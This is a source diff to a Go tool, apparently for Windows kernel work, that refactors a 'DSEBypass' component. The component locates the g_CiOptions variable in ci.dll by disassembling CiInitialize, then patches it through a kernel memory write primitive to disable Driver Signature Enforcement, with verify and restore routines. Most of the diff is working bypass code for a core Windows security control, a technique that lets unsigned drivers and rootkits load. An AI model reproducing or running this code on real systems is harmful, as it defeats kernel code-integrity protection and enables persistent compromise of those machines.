@@ -40,9 +40,6 @@ func NewDSEBypass(finder *KernelModuleFinder, km *KernelMemory) *DSEBypass {
 
 func (d *DSEBypass) FindCiOptionsRVAFromDisk() (uint32, error) {
 	f := mylog.Check2(os.Open(`C:\Windows\System32\ci.dll`))
-
-	defer func() { mylog.Check(f.Close()) }()
-
 	peFile := mylog.Check2(pe.NewFile(f, &pe.Options{}))
 
 	defer func() { mylog.Check(peFile.Close()) }()
@@ -69,12 +66,13 @@ func (d *DSEBypass) FindCiOptionsRVAFromDisk() (uint32, error) {
 
 		for i := funcOff; i < len(data)-6; {
 			inst, e := x86asm.Decode(data[i:], 64)
-			if e != nil || inst.Len == 0 {
-				i++
-				continue
+			if e != nil {
+				break
 			}
 
 			if inst.Op == x86asm.CALL && inst.Len >= 5 {
+				syntax := x86asm.IntelSyntax(inst, 0, nil)
+				mylog.Success(syntax) //todo  像iopxxxconntrolfile 那样取出来才直观
 				disp := int32(binary.LittleEndian.Uint32(data[i+1 : i+inst.Len]))
 				target := ciInitRVA + uint32(i-funcOff) + uint32(inst.Len) + uint32(disp)
 				mylog.Info("CiInitialize call +0x" + fmt.Sprintf("%04X", i-funcOff) + " -> 0x" + fmt.Sprintf("%06X", target))
@@ -113,7 +111,7 @@ func (d *DSEBypass) FindCiOptionsRVAFromDisk() (uint32, error) {
 	return 0, fmt.Errorf("CiInitialize section not found")
 }
 
-func (d *DSEBypass) FindCiOptions() (uint64, error) {
+func (d *DSEBypass) FindCiOptions() uint64 {
 	ciBase := d.finder.ModuleBaseByName("ci.dll")
 
 	ciOptionsRVA := mylog.Check2(d.FindCiOptionsRVAFromDisk())
@@ -121,13 +119,10 @@ func (d *DSEBypass) FindCiOptions() (uint64, error) {
 	ciOptionsAddr := ciBase + uint64(ciOptionsRVA)
 	mylog.Hex(ciOptionsAddr)
 
-	val, readErr := d.km.ReadUint32(ciOptionsAddr)
-	if readErr != nil {
-		return 0, fmt.Errorf("read g_CiOptions at 0x%x failed: %w", ciOptionsAddr, readErr)
-	}
+	val := d.km.ReadUint32(ciOptionsAddr)
 	mylog.Success("g_CiOptions addr=0x" + fmt.Sprintf("%X", ciOptionsAddr) + " val=0x" + fmt.Sprintf("%08X", val))
 	d.logCiConfig(val)
-	return ciOptionsAddr, nil
+	return ciOptionsAddr
 }
 
 func (d *DSEBypass) logCiConfig(val uint32) {
@@ -172,38 +167,38 @@ func (d *DSEBypass) ParseCiConfigFlags(val uint32) []string {
 	return flags
 }
 
-func (d *DSEBypass) ReadCiOptions() (uint32, error) {
+func (d *DSEBypass) ReadCiOptions() uint32 {
 	if d.ciOptionsAddr == 0 {
-		d.ciOptionsAddr = mylog.Check2(d.FindCiOptions())
+		d.ciOptionsAddr = d.FindCiOptions()
 	}
 	return d.km.ReadUint32(d.ciOptionsAddr)
 }
 
-func (d *DSEBypass) WriteCiOptions(val uint32) error {
+func (d *DSEBypass) WriteCiOptions(val uint32) {
 	if d.ciOptionsAddr == 0 {
-		mylog.Check2(d.FindCiOptions())
+		d.FindCiOptions()
 	}
-	return d.km.WriteUint32(d.ciOptionsAddr, val)
+	d.km.WriteUint32(d.ciOptionsAddr, val)
 }
 
 func (d *DSEBypass) DSEEnabled() bool {
-	val := mylog.Check2(d.ReadCiOptions())
+	val := d.ReadCiOptions()
 
 	return (val & CI_OPT_IN_KM) != 0
 }
 
 func (d *DSEBypass) HVCIActive() bool {
-	val := mylog.Check2(d.ReadCiOptions())
+	val := d.ReadCiOptions()
 
 	return (val & CI_OPT_HVCI_ACTIVE) != 0
 }
 
 func (d *DSEBypass) Disable() bool {
-	addr := mylog.Check2(d.FindCiOptions())
+	addr := d.FindCiOptions()
 
 	d.ciOptionsAddr = addr
 
-	currentVal := mylog.Check2(d.km.ReadUint32(addr))
+	currentVal := d.km.ReadUint32(addr)
 
 	d.originalCiOptions = currentVal
 	mylog.Info("current g_CiOptions=0x" + fmt.Sprintf("%08X", currentVal))
@@ -219,9 +214,9 @@ func (d *DSEBypass) Disable() bool {
 		mylog.Info("direct g_CiOptions patching with HVCI active may cause BSOD")
 	}
 
-	mylog.Check(d.km.WriteUint32(addr, CI_OPTIONS_DISABLED))
+	d.km.WriteUint32(addr, CI_OPTIONS_DISABLED)
 
-	verify := mylog.Check2(d.km.ReadUint32(addr))
+	verify := d.km.ReadUint32(addr)
 	if verify != CI_OPTIONS_DISABLED {
 		mylog.Warning("verify g_CiOptions failed", "expected", fmt.Sprintf("0x%08X", CI_OPTIONS_DISABLED),
 			"got", fmt.Sprintf("0x%08X", verify))
@@ -239,7 +234,7 @@ func (d *DSEBypass) Restore() bool {
 		return true
 	}
 
-	currentVal := mylog.Check2(d.km.ReadUint32(d.ciOptionsAddr))
+	currentVal := d.km.ReadUint32(d.ciOptionsAddr)
 
 	if (currentVal & 0x6) != 0 {
 		mylog.Info("DSE already enabled, restore skipped g_CiOptions=0x" + fmt.Sprintf("%08X", currentVal))
@@ -252,9 +247,9 @@ func (d *DSEBypass) Restore() bool {
 		target = CI_OPTIONS_DSE_ENABLED
 	}
 
-	mylog.Check(d.km.WriteUint32(d.ciOptionsAddr, target))
+	d.km.WriteUint32(d.ciOptionsAddr, target)
 
-	verify := mylog.Check2(d.km.ReadUint32(d.ciOptionsAddr))
+	verify := d.km.ReadUint32(d.ciOptionsAddr)
 	if verify != target {
 		mylog.Warning("verify restore failed", "expected", fmt.Sprintf("0x%08X", target),
 			"got", fmt.Sprintf("0x%08X", verify))
